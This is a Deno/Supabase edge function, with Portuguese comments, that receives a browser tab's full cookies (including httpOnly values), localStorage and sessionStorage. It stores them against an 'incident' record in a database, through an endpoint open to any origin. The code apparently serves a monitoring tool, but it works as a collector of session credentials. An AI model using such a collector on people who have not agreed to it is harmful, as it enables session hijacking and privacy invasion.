import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
  'Access-Control-Allow-Methods': 'POST, OPTIONS',
};

serve(async (req) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    );

const { incident_id, cookies, host, tab_url, localStorage, sessionStorage } = await req.json();

    // ✅ CORREÇÃO #2: Validar e normalizar cookies
    const validatedCookies = cookies.map(cookie => {
      // Pular cookies inválidos
      if (!cookie.name || cookie.value === undefined) {
        console.warn('[cookie-sync] Cookie inválido, pulando:', cookie.name || 'unnamed');
        return null;
      }
      
      // Normalizar domínio (importante!)
      let domain = cookie.domain || '';
      if (domain === '' && host) {
        domain = host.startsWith('.') ? host : `.${host}`;
        console.log(`[cookie-sync] Domínio vazio corrigido para: ${domain}`);
      }
      
      // Garantir isSession está definido
      const isSession = cookie.isSession !== undefined 
        ? cookie.isSession 
        : (!cookie.expirationDate || cookie.expirationDate <= 0);
      
      return {
        name: cookie.name,
        value: cookie.value,
        domain: domain,
        path: cookie.path || '/',
        secure: cookie.secure || false,
        httpOnly: cookie.httpOnly || false,
        sameSite: cookie.sameSite || 'Lax',
        expirationDate: cookie.expirationDate,
        isSession: isSession
      };
    }).filter(c => c !== null);

    console.log(`[cookie-sync] Validados ${validatedCookies.length}/${cookies.length} cookies`);

    if (!incident_id || !validatedCookies || validatedCookies.length === 0) {
      return new Response(
        JSON.stringify({ error: 'Missing incident_id or cookies array' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`Cookie sync: Updating incident ${incident_id} with ${validatedCookies.length} cookies from ${host}`);

    // Generate cookie excerpt
    const cookieExcerpt = validatedCookies.length > 0
      ? `${validatedCookies.length} cookies detected: ${validatedCookies.slice(0, 3).map(c => `${c.name}=${c.value.substring(0, 20)}...`).join(', ')}`
      : 'No cookies';

    // Update incident with fresh cookies + storage
    const { error } = await supabase
      .from('incidents')
      .update({
        full_cookie_data: validatedCookies,
        cookie_excerpt: cookieExcerpt,
        local_storage: localStorage || null,
        session_storage: sessionStorage || null,
        updated_at: new Date().toISOString()
      })
      .eq('incident_id', incident_id);

    if (error) {
      console.error('Error updating incident:', error);
      return new Response(
        JSON.stringify({ error: error.message }),
        { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    console.log(`Cookie sync: Successfully updated ${validatedCookies.length} cookies for incident ${incident_id}`);
    console.log(`Sample cookies: ${validatedCookies.slice(0, 5).map(c => c.name).join(', ')}`);

    return new Response(
      JSON.stringify({ 
        success: true, 
        cookies_updated: validatedCookies.length,
        cookies_skipped: cookies.length - validatedCookies.length,
        incident_id 
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  } catch (error) {
    console.error('Cookie sync error:', error);
    return new Response(
      JSON.stringify({ error: error.message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
